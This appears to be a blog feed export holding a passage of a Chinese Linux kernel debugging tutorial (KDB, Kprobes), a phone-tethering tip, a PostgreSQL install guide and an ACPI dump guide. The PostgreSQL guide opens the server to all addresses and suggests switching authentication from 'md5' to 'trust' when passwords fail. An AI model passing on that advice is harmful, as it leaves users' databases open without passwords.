false;">`[0]kdb>md%ebp0xc74c9f38c74c9f60c0136c40000001f0000000000xc74c9f4808053328c0425238c04253a8000000000xc74c9f58000001f000000246c74c9f6cc0136a250xc74c9f68c74c8000c74c9f74c0136d6dc74c9fbc0xc74c9f78c014fe45c74c80000000000008053328[0]kdb>0xc0136c400xc0136c40=0xc0136c40(__alloc_pages+0x44)[0]kdb>0xc0136a250xc0136a25=0xc0136a25(_alloc_pages+0x19)[0]kdb>0xc0136d6d0xc0136d6d=0xc0136d6d(__get_free_pages+0xd)`</pre> <p><span style="vertical-align:baseline;">我们可以看到 rmqueue() 被 __alloc_pages 调用，后者接下来又被 _alloc_pages 调用，以此类推。</span><br> <span style="vertical-align:baseline;">每一帧的第一个双字（double word）指向下一帧，这后面紧跟着调用函数的地址。因此，跟踪堆栈就变成一件轻松的工作了。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">5.3 技巧 #3</span><br> <span style="vertical-align:baseline;">go 命令可以有选择地以一个地址作为参数。如果您想在某个特定地址处继续执行，则可以提供该地址作为参数。另一个办法是使用rm 命令修改指令指针寄存器，然后只要输入 go 。如果您想跳过似乎会引起问题的某个特定指令或一组指令，这就会很有用。但是，请注意，该指令使用不慎会造成严重的问题，系统可能会严重崩溃。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">5.4 技巧 #4</span><br> <span style="vertical-align:baseline;">您可以利用一个名为 defcmd 的有用命令来定义自己的命令集。例如，每当遇到断点时，您可能希望能同时检查某个特殊变量、检查某些寄存器的内容并转储堆栈。通常，您必须要输入一系列命令，以便能同时执行所有这些工作。 defcmd 允许您定义自己的命令，该命令可以包含一个或多个预定义的 KDB 命令。然后只需要用一个命令就可以完成所有这三项工作。其语法如下：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>defcmdname"usage""help"[0]kdb>[defcmd]typethecommandshere[0]kdb>[defcmd]endefcmd`</pre> <p><span style="vertical-align:baseline;">例如，可以定义一个（简单的）新命令 hari ，它显示从地址 0xc000000 开始的一行内存、显示寄存器的内容并转储堆栈：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>defcmdhari"""noargumentsneeded"[0]kdb>[defcmd]md0xc0000001[0]kdb>[defcmd]rd[0]kdb>[defcmd]md%ebp1[0]kdb>[defcmd]endefcmd`</pre> <p><span style="vertical-align:baseline;">该命令的输出会是：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>hari[hari]kdb>md0xc00000010xc00000000000001f000e816f000e2c3f000e816[hari]kdb>rdeax=0x00000000ebx=0xc0105330ecx=0xc0466000edx=0xc0466000.......[hari]kdb>md%ebp10xc0467fbcc0467fd0c01053d200000002000a0200[0]kdb>`</pre> <p> <span style="vertical-align:baseline;">5.5 技巧 #5</span><br> <span style="vertical-align:baseline;">可以使用 bph 和 bpha 命令（假如体系结构支持使用硬件寄存器）来应用读写断点。这意味着每当从某个特定地址读取数据或将数据写入该地址时，我们都可以对此进行控制。当调试数据／内存毁坏问题时这可能会极其方便，在这种情况中您可以用它来识别毁坏的代码／进程。</span><br> <span style="vertical-align:baseline;">示例</span><br> <span style="vertical-align:baseline;">每当将四个字节写入地址 0xc0204060 时就进入内核调试器：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>bph0xc0204060dataw4`</pre> <p><span style="vertical-align:baseline;">在读取从 0xc000000 开始的至少两个字节的数据时进入内核调试器：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`[0]kdb>bph0xc000000datar2`</pre> <p><span id="OSC_h4_43"></span></p><h4 id="6-结束语"><a href="#6-结束语" class="headerlink" title="6 结束语"></a><span style="vertical-align:baseline;">6 结束语</span></h4><p><span style="vertical-align:baseline;">对于执行内核调试，KDB 是一个方便的且功能强大的工具。它提供了各种选项，并且使我们能够分析内存内容和数据结构。最妙的是，它不需要用另一台机器来执行调试。</span><br> <span style="font-size:11px;background-color:#FFFFFF;vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">参考：</span><br> <a href="http://www.ibm.com/developerworks/cn/linux/l-kdbug/index.html" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">Linux 内核调试器内幕 KDB入门指南</span></a> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h3_44"></span></p><h3 id="十二-Kprobes"><a href="#十二-Kprobes" class="headerlink" title="十二 Kprobes"></a><span style="vertical-align:baseline;">十二 Kprobes</span></h3><p><span style="vertical-align:baseline;">Kprobes 是 Linux 中的一个简单的轻量级装置，让您可以将断点插入到正在运行的内核之中。 Kprobes 提供了一个强行进入任何内核例程并从中断处理器无干扰地收集信息的接口。使用 Kprobes 可以 轻松地收集处理器寄存器和全局数据结构等调试信息。开发者甚至可以使用 Kprobes 来修改 寄存器值和全局数据结构的值。</span><br> <span style="vertical-align:baseline;">为完成这一任务，Kprobes 向运行的内核中给定地址写入断点指令，插入一个探测器。 执行被探测的指令会导致断点错误。Kprobes 钩住（hook in）断点处理器并收集调试信息。Kprobes 甚至可以单步执行被探测的指令。</span><br> <span style="vertical-align:baseline;"></span> </p><p><span id="OSC_h4_45"></span></p><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a><span style="vertical-align:baseline;">1 安装</span></h4><p><span style="vertical-align:baseline;">要安装 Kprobes，需要从 Kprobes 主页下载最新的补丁。 打包的文件名称类似于 kprobes-2.6.8-rc1.tar.gz。解开补丁并将其安装到 Linux 内核：</span><br> <span style="vertical-align:baseline;"></span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`$tar-xvzfkprobes-2.6.8-rc1.tar.gz$cd/usr/src/linux-2.6.8-rc1$patch-p1<.. kprobes-2.6.8-rc1-base.patch`<="" pre=""> <p><span style="vertical-align:baseline;">Kprobes 利用了 SysRq 键，这个 DOS 时代的产物在 Linux 中有了新的用武之地。您可以在 Scroll Lock键左边找到 SysRq 键；它通常标识为 Print Screen。要为 Kprobes 启用 SysRq 键，需要安装 kprobes-2.6.8-rc1-sysrq.patch 补丁：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`$patch-p1<.. kprobes-2.6.8-rc1-sysrq.patch`<="" pre=""> <p><span style="vertical-align:baseline;">使用 make xconfig/ make menuconfig/ make oldconfig 配置内核，并 启用 CONFIG_KPROBES 和 CONFIG_MAGIC_SYSRQ标记。 编译并引导到新内核。您现在就已经准备就绪，可以插入 printk 并通过编写简单的 Kprobes 模块来动态而且无干扰地 收集调试信息。</span><br> <a href="http://www.ibm.com/developerworks/cn/linux/l-kprobes.html#ibm-pcon" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;"></span></a> </p><p><span id="OSC_h4_46"></span></p><h4 id="2-编写-Kprobes-模块"><a href="#2-编写-Kprobes-模块" class="headerlink" title="2 编写 Kprobes 模块"></a><span style="vertical-align:baseline;">2 编写 Kprobes 模块</span></h4><p><span style="vertical-align:baseline;">对于每一个探测器，您都要分配一个结构体 struct kprobe kp; （参考 include/linux/kprobes.h 以获得关于此数据结构的详细信息）。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">清单 9. 定义 pre、post 和 fault 处理器</span> </p><pre class="brush:cpp; toolbar: true; auto-links: false;">`/*pre_handler:thisiscalledjustbeforetheprobedinstructionis*executed.*/inthandler_pre(structkprobe*p,structpt_regs*regs){printk("pre_handler:p->addr=0x%p,eflags=0x%lx\n",p->addr,regs->eflags);return0;}/*post_handler:thisiscalledaftertheprobedinstructionisexecuted*(providednoexceptionisgenerated).*/voidhandler_post(structkprobe*p,structpt_regs*regs,unsignedlongflags){printk("post_handler:p->addr=0x%p,eflags=0x%lx\n",p->addr,regs->eflags);}/*fault_handler:thisiscalledifanexceptionisgeneratedforany*instructionwithinthefault-handler,orwhenKprobes*single-stepstheprobedinstruction.*/inthandler_fault(structkprobe*p,structpt_regs*regs,inttrapnr){printk("fault_handler:p->addr=0x%p,eflags=0x%lx\n",p->addr,regs->eflags);return0;}`</pre> <p> <span style="vertical-align:baseline;">2.1 获得内核例程的地址</span><br> <span style="vertical-align:baseline;">在注册过程中，您还需要指定插入探测器的内核例程的地址。使用这些方法中的任意一个来获得内核例程 的地址：</span> </p></..></pre></..></pre></li></ul><ol><li><span style="vertical-align:baseline;">从 System.map 文件直接得到地址。 </span></li><li><span style="vertical-align:baseline;">例如，要得到 do_fork 的地址，可以在命令行执行 $grep do_fork /usr/src/linux/System.map 。</span></li><li><span style="vertical-align:baseline;">使用 nm 命令。 </span></li><li><span style="vertical-align:baseline;">$nm vmlinuz |grep do_fork</span></li><li><span style="vertical-align:baseline;">从 /proc/kallsyms 文件获得地址。 </span></li><li><span style="vertical-align:baseline;">$cat /proc/kallsyms |grep do_fork</span></li><li><span style="vertical-align:baseline;">使用 kallsyms_lookup_name() 例程。 </span></li><li><p><span style="vertical-align:baseline;">这个例程是在 kernel/kallsyms.c 文件中定义的，要使用它，必须启用 CONFIG_KALLSYMS 编译内核。kallsyms_lookup_name() 接受一个字符串格式内核例程名， 返回那个内核例程的地址。例如：kallsyms_lookup_name(“do_fork”);</span> </p><p><span style="vertical-align:baseline;">然后在 init_moudle 中注册您的探测器：</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">清单 10. 注册一个探测器</span> </p><pre class="brush:cpp; toolbar: true; auto-links: false;">`/*specifypre_handleraddress*/kp.pre_handler=handler_pre;/*specifypost_handleraddress*/kp.post_handler=handler_post;/*specifyfault_handleraddress*/kp.fault_handler=handler_fault;/*specifytheaddress/offsetwhereyouwanttoinsertprobe.*Youcangettheaddressusingoneofthemethodsdescribedabove.*/kp.addr=(kprobe_opcode_t*)kallsyms_lookup_name("do_fork");/*checkifthekallsyms_lookup_name()returnedthecorrectvalue.*/if(kp.add==NULL){printk("kallsyms_lookup_namecouldnotfindaddressforthespecifiedsymbolname\n");return1;}/*orspecifyaddressdirectly.*$grep"do_fork"/usr/src/linux/System.map*or*$cat/proc/kallsyms|grepdo_fork*or*$nmvmlinuz|grepdo_fork*/kp.addr=(kprobe_opcode_t*)0xc01441d0;/*AllsettoregisterwithKprobes*/register_kprobe(&kp);`</pre> <p><span style="vertical-align:baseline;">一旦注册了探测器，运行任何 shell 命令都会导致一个对 do_fork 的调用，您将可以在控制台上或者运行 dmesg 命令来查看您的 printk。做完后要记得注销探测器：</span><br> <span style="vertical-align:baseline;">unregister_kprobe(&amp;kp);</span><br> <span style="vertical-align:baseline;">下面的输出显示了 kprobe 的地址以及 eflags 寄存器的内容：</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">$tail -5 /var/log/messages </span><br> <span style="vertical-align:baseline;">Jun 14 18:21:18 llm05 kernel: pre_handler: p-&gt;addr=0xc01441d0, eflags=0x202 </span><br> <span style="vertical-align:baseline;">Jun 14 18:21:18 llm05 kernel: post_handler: p-&gt;addr=0xc01441d0, eflags=0x196</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">2.2 获得偏移量</span><br> <span style="vertical-align:baseline;">您可以在例程的开头或者函数中的任意偏移位置插入 printk（偏移量必须在指令范围之内）。 下面的代码示例展示了如何来计算偏移量。首先，从对象文件中反汇编机器指令，并将它们 保存为一个文件：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`$objdump-D/usr/src/linux/kernel/fork.o>fork.dis`</pre> <p><span style="vertical-align:baseline;">其结果是：</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">清单 11. 反汇编的 fork</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`000022b0<do_fork>:22b0:55push%ebp22b1:89e5mov%esp,%ebp22b3:57push%edi22b4:89c7mov%eax,%edi22b6:56push%esi22b7:89d6mov%edx,%esi22b9:53push%ebx22ba:83ec38sub$0x38,%esp22bd:c745d000000000movl$0x0,0xffffffd0(%ebp)22c4:89cbmov%ecx,%ebx22c6:89442404mov%eax,0x4(%esp)22ca:c704240a000000movl$0xa,(%esp)22d1:e8fcffffffcall22d2<do_fork+0x22>22d6:b800e0ffffmov$0xffffe000,%eax22db:21e0and%esp,%eax22dd:8b00mov(%eax),%eax`</do_fork+0x22></do_fork></pre> <p><span style="vertical-align:baseline;">要在偏移位置 0x22c4 插入探测器，先要得到与例程的开始处相对的偏移量 0x22c4 - 0x22b0 = 0x14 ，然后将这个偏移量添加到 do_fork 的地址 0xc01441d0 + 0x14 。（运行 $cat /proc/kallsyms | grep do_fork 命令以获得 do_fork 的地址。）</span><br> <span style="vertical-align:baseline;">您还可以将 do_fork 的相对偏移量 0x22c4 - 0x22b0 = 0x14 添加到 kallsyms_lookup_name(“do_fork”); 的输入，即：0x14 + kallsyms_lookup_name(“do_fork”);</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">2.3 转储内核数据结构</span><br> <span style="vertical-align:baseline;">现在，让我们使用修改过的用来转储数据结构的 Kprobe post_handler 来转储运行在系统上的所有作业的一些组成部分：</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">清单 12. 用来转储数据结构的修改过的 Kprope post_handler</span> </p><pre class="brush:cpp; toolbar: true; auto-links: false;">`voidhandler_post(structkprobe*p,structpt_regs*regs,unsignedlongflags){structtask_struct*task;read_lock(&tasklist_lock);for_each_process(task){printk("pid=%xtask-info_ptr=%lx\n",task->pid,task->thread_info);printk("thread-infoelementstatus=%lx,flags=%lx,cpu=%lx\n",task->thread_info->status,task->thread_info->flags,task->thread_info->cpu);}read_unlock(&tasklist_lock);}`</pre> <p><span style="vertical-align:baseline;">这个模块应该插入到 do_fork 的偏移位置。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">清单 13. pid 1508 和 1509 的结构体 thread_info 的输出</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`$tail-10/var/log/messagesJun2218:14:25llm05kernel:thread-infoelementstatus=0,flags=0,cpu=1Jun2218:14:25llm05kernel:pid=5e4task-info_ptr=f5948000Jun2218:14:25llm05kernel:thread-infoelementstatus=0,flags=8,cpu=0Jun2218:14:25llm05kernel:pid=5e5task-info_ptr=f5eca000`</pre> <p> <span style="vertical-align:baseline;">2.4 启用奇妙的 SysRq 键</span><br> <span style="vertical-align:baseline;">为了支持 SysRq 键，我们已经进行了编译。这样来启用它：</span> </p><pre class="brush:shell; toolbar: true; auto-links: false;">`$echo1>/proc/sys/kernel/sysrq`</pre> <p><span style="vertical-align:baseline;">现在，您可以使用 Alt+SysRq+W 在控制台上或者到 /var/log/messages 中去查看所有插入的内核探测器。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">清单 14. /var/log/messages 显示出在 do_fork 插入了一个 Kprobe</span> </p><p><pre class="brush:shell; toolbar: true; auto-links: false;">`Jun2310:24:48linux-udp4749545udskernel:SysRq:Showkprobes<br>Jun2310:24:48linux-udp4749545udskernel:<br>Jun2310:24:48linux-udp4749545udskernel:[<c011ea60>]do_fork+0x0/0x1de</c011ea60></pre></p></li></ol><p><span id="OSC_h4_47"></span></p><h4 id="3-使用-Kprobes-更好地进行调试"><a href="#3-使用-Kprobes-更好地进行调试" class="headerlink" title="3 使用 Kprobes 更好地进行调试"></a><span style="vertical-align:baseline;">3 使用 Kprobes 更好地进行调试</span></h4><p><span style="vertical-align:baseline;">由于探测器事件处理器是作为系统断点中断处理器的扩展来运行，所以它们很少或者根本不依赖于系统 工具 —— 这样可以被植入到大部分不友好的环境中（从中断时间和任务时间到禁用的上下文间切换和支持 SMP 的代码路径）—— 都不会对系统性能带来负面影响。</span><br> <span style="vertical-align:baseline;">使用 Kprobes 的好处有很多。不需要重新编译和重新引导内核就可以插入 printk。为了进行调试可以记录 处理器寄存器的日志，甚至进行修改 —— 不会干扰系统。类似地，同样可以无干扰地记录 Linux 内核数据结构的日志，甚至 进行修改。您甚至可以使用 Kprobes 调试 SMP 系统上的竞态条件 —— 避免了您自己重新编译和重新引导的所有 麻烦。您将发现内核调试比以往更为快速和简单。</span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">参考：</span><br> <a href="http://www.ibm.com/developerworks/cn/linux/l-kprobes.html" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">使用 Kprobes 调试内核</span></a> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;"></span><br> <span style="vertical-align:baseline;">本文参考：</span><br> <span style="vertical-align:baseline;">1 Linux内核设计与实现 P243 第十八章 调试</span> <a href="http://www.mjmwired.net/kernel/Documentation/dynamic-debug-howto.txt" target="_blank" rel="noopener"><span style="color:#1155CC;background-color:#CCCCCC;vertical-align:baseline;"></span></a><br> <span style="vertical-align:baseline;">3 </span> <a href="http://www.360doc.com/content/10/1215/15/1378815_78374144.shtml" target="_blank" rel="noopener"><span style="color:#1155CC;vertical-align:baseline;">linux内核调试指南</span></a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;span style=&quot;vertical-align:baseline;&quot;&gt;内核开发比用户空间开发更难的一个因素就是内核调试艰难。内核错误往往会导致系统宕机，很难保留出错时的现场。调试内核的关键在于你的对内核的深刻理解。&lt;/span&gt; &lt;/p&gt;
&lt;h4 id=&quot;&quot;&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="Linux内核调试" scheme="https://fengguoqing.github.io/tags/Linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>笔记本使用手机流量上网</title>
    <link href="https://fengguoqing.github.io/2013/02/08/%E7%AC%94%E8%AE%B0%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%89%8B%E6%9C%BA%E6%B5%81%E9%87%8F%E4%B8%8A%E7%BD%91/"/>
    <id>https://fengguoqing.github.io/2013/02/08/笔记本使用手机流量上网/</id>
    <published>2013-02-08T15:22:49.000Z</published>
    <updated>2017-11-25T10:41:07.679Z</updated>
    
    <content type="html"><![CDATA[<p> 因为家里没有网络，但是回家之后想上上网，所以想到了可以使用手机流量，用android手机自带的网络共享与便携热点功能建立一个无线网络，这样笔记本就可以找到该热点并连接上了。但是这样只能上QQ无法上网，经过研究发现了如下两种方法可以解决该问题。 </p><p> 1. 将手机的APN由CMWAP修改为CMNET。 </p><p> 2. 使用代理，HTTP 代理10.0.0.172,端口80.对所有协议均使用相同的代理服务器. </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 因为家里没有网络，但是回家之后想上上网，所以想到了可以使用手机流量，用android手机自带的网络共享与便携热点功能建立一个无线网络，这样笔记本就可以找到该热点并连接上了。但是这样只能上QQ无法上网，经过研究发现了如下两种方法可以解决该问题。 &lt;/p&gt;
&lt;p&gt; 1. 将手
      
    
    </summary>
    
    
      <category term="教程" scheme="https://fengguoqing.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>how to install PostgreSQL on ubuntu</title>
    <link href="https://fengguoqing.github.io/2013/01/13/how-to-install-PostgreSQL-on-ubuntu/"/>
    <id>https://fengguoqing.github.io/2013/01/13/how-to-install-PostgreSQL-on-ubuntu/</id>
    <published>2013-01-12T16:29:56.000Z</published>
    <updated>2017-12-02T05:09:13.233Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>This installs the database server/client, some extra utility scripts and the pgAdmin GUI application for working with the database. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo apt-get install postgresql postgresql-client postgresql-contrib</span><br><span class="line"><span class="meta">$</span> sudo apt-get install pgadmin3</span><br></pre></td></tr></table></figure></li><li><p>Now we need to reset the password for the ‘postgres’ admin account for the server, substitute in the password you want to use for your administrator account. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo su postgres -c psql template1 </span><br><span class="line">template1=# ALTER USER postgres WITH PASSWORD 'password'; </span><br><span class="line">template1=# \q</span><br></pre></td></tr></table></figure></li><li><p>That alters the password for within the database, now we need to do the same for the unix user ‘postgres’. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo passwd -d postgres </span><br><span class="line"><span class="meta">$</span> sudo su postgres -c passwd</span><br></pre></td></tr></table></figure></li><li><p>Set-up the PostgreSQL admin pack that enables better logging and monitoring within pgAdmin. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo su postgres -c psql &lt; /usr/share/postgresql/9.1/extension/adminpack--1.0.sql</span><br></pre></td></tr></table></figure></li><li><p>Edit the postgresql.conf file. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo gedit /etc/postgresql/9.1/main/postgresql.conf</span><br></pre></td></tr></table></figure><p>Change the line:<br><code>#listen_addresses = &#39;localhost&#39;</code><br>to<br><code>listen_addresses = &#39;*&#39;</code><br>and also change the line:<br><code>#password_encryption = on</code><br>to<br><code>password_encryption = on</code></p></li><li><p>Define who can access the server. This is all done using the pg_hba.conf. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo gedit /etc/postgresql/8.3/main/pg_hba.conf</span><br></pre></td></tr></table></figure><p>add this text to the bottom of the file:<br>host all all [ip address] [subnet mask] md5<br>add in your subnet mask (i.e. 255.255.255.0) and the IP address of your server (i.e. 138.250.192.115).<br>Note:if you have some password error, please change all “md5” to “trust” in this file. </p></li><li><p>Now all you have to do is restart the server. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo /etc/init.d/postgresql restart</span><br></pre></td></tr></table></figure><p>Reference:<br><a href="http://hocuspokus.net/2008/05/install-postgresql-on-ubuntu-804/" target="_blank" rel="noopener">http://hocuspokus.net/2008/05/install-postgresql-on-ubuntu-804/</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;This installs the database server/client, some extra utility scripts and the pgAdmin GUI application for working with the databa
      
    
    </summary>
    
      <category term="后端" scheme="https://fengguoqing.github.io/categories/%E5%90%8E%E7%AB%AF/"/>
    
    
      <category term="教程" scheme="https://fengguoqing.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
      <category term="PostgreSQL" scheme="https://fengguoqing.github.io/tags/PostgreSQL/"/>
    
  </entry>
  
  <entry>
    <title>ACPI DEBUG方法</title>
    <link href="https://fengguoqing.github.io/2013/01/12/ACPI-DEBUG%E6%96%B9%E6%B3%95/"/>
    <id>https://fengguoqing.github.io/2013/01/12/ACPI-DEBUG方法/</id>
    <published>2013-01-12T15:56:24.000Z</published>
    <updated>2017-11-29T14:27:55.856Z</updated>
    
    <content type="html"><![CDATA[<h1 id="获取ACPI-TABLE的方法"><a href="#获取ACPI-TABLE的方法" class="headerlink" title="获取ACPI TABLE的方法"></a>获取ACPI TABLE的方法</h1><h2 id="1-首先要安装acpidump和iasl命令"><a href="#1-首先要安装acpidump和iasl命令" class="headerlink" title="1. 首先要安装acpidump和iasl命令"></a>1. 首先要安装acpidump和iasl命令</h2><p>  有的机器上需要安装pmtools才可以。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo apt-get install acpidump </span><br><span class="line"><span class="meta">$</span> sudo apt-get install iasl </span><br><span class="line"><span class="meta">$</span> sudo apt-get install pmtools</span><br></pre></td></tr></table></figure></p><h2 id="2-导出ACPI的数据。"><a href="#2-导出ACPI的数据。" class="headerlink" title="2. 导出ACPI的数据。"></a>2. 导出ACPI的数据。</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo cat /proc/acpi/dsdt &gt; dstd.dat</span><br></pre></td></tr></table></figure><p>  或者<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo cat /sys/firmware/acpi/tables/DSDT &gt; /tmp/dsdt.dat</span><br></pre></td></tr></table></figure></p><p>  如果找不到该文件可以使用下面的命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo acpidump &gt; acpi.dat</span><br></pre></td></tr></table></figure></p><h2 id="3-分离各表格数据，会生成多个数据文件。"><a href="#3-分离各表格数据，会生成多个数据文件。" class="headerlink" title="3. 分离各表格数据，会生成多个数据文件。"></a>3. 分离各表格数据，会生成多个数据文件。</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> acpixtract -a acpi.dat </span><br><span class="line">Acpi table [DSDT] - 41555 bytes written to DSDT.dat </span><br><span class="line">Acpi table [FACS] - 64 bytes written to FACS.dat </span><br><span class="line">Acpi table [FACP] - 116 bytes written to FACP.dat </span><br><span class="line">Acpi table [APIC] - 132 bytes written to APIC.dat </span><br><span class="line">Acpi table [ASF!] - 99 bytes written to ASF!.dat </span><br><span class="line">Acpi table [MCFG] - 60 bytes written to MCFG.dat </span><br><span class="line">Acpi table [TCPA] - 50 bytes written to TCPA.dat </span><br><span class="line">Acpi table [SLIC] - 374 bytes written to SLIC.dat </span><br><span class="line">Acpi table [HPET] - 56 bytes written to HPET.dat </span><br><span class="line">Acpi table [DMAR] - 456 bytes written to DMAR.dat </span><br><span class="line">Acpi table [RSDT] - 68 bytes written to RSDT.dat </span><br><span class="line">Acpi table [RSDP] - 20 bytes written to RSDP.dat</span><br></pre></td></tr></table></figure><h2 id="4-反汇编DSDT-dat"><a href="#4-反汇编DSDT-dat" class="headerlink" title="4. 反汇编DSDT.dat"></a>4. 反汇编DSDT.dat</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> iasl -d DSDT.dat </span><br><span class="line">Intel ACPI Component Architecture </span><br><span class="line">AML Disassembler version 20100528 [Oct 15 2010] </span><br><span class="line">Copyright (c) 2000 - 2010 Intel Corporation </span><br><span class="line">Supports ACPI Specification Revision 4.0a </span><br><span class="line">Loading Acpi table from file DSDT.dat </span><br><span class="line">Acpi table [DSDT] successfully installed and loaded </span><br><span class="line">Pass 1 parse of [DSDT] </span><br><span class="line">Pass 2 parse of [DSDT] </span><br><span class="line">Parsing Deferred Opcodes (Methods/Buffers/Packages/Regions) </span><br><span class="line">...........................................................</span><br><span class="line">...........................................................</span><br><span class="line">...........................................................</span><br><span class="line">...........................................................</span><br><span class="line">...........................................................</span><br><span class="line">...........................................................</span><br><span class="line">...........................................................</span><br><span class="line">...................................................... </span><br><span class="line">Parsing completed </span><br><span class="line">Disassembly completed, written to "DSDT.dsl"</span><br></pre></td></tr></table></figure><h2 id="5-重新编译DSL"><a href="#5-重新编译DSL" class="headerlink" title="5. 重新编译DSL"></a>5. 重新编译DSL</h2><p>根据需要修改<strong>DSDT.dsl</strong>文件，然后重新编译该文件，会生成<strong>DSDT.aml</strong>和<strong>DSDT.hex</strong>两个文件。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> iasl -tc dsdt.dsl </span><br><span class="line">Intel ACPI Component Architecture </span><br><span class="line">ASL Optimizing Compiler version 20100528 [Oct 15 2010] </span><br><span class="line">Copyright (c) 2000 - 2010 Intel Corporation </span><br><span class="line">Supports ACPI Specification Revision 4.0a </span><br><span class="line">...................................................... </span><br><span class="line">ASL Input: DSDT.dsl - 8762 lines, 320704 bytes, 3778 keywords </span><br><span class="line">AML Output: DSDT.aml - 39328 bytes, 780 named objects, 2998 executable opcodes </span><br><span class="line">Compilation complete. 0 Errors, 41 Warnings, 0 Remarks, 988 Optimizations</span><br></pre></td></tr></table></figure></p><h2 id="6-更新DSDT的方法。"><a href="#6-更新DSDT的方法。" class="headerlink" title="6. 更新DSDT的方法。"></a>6. 更新DSDT的方法。</h2><ul><li><p>其一(没有测试过，不知道能否成功):<br>使用新的dsdt.aml代替BIOS中的版本: </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp 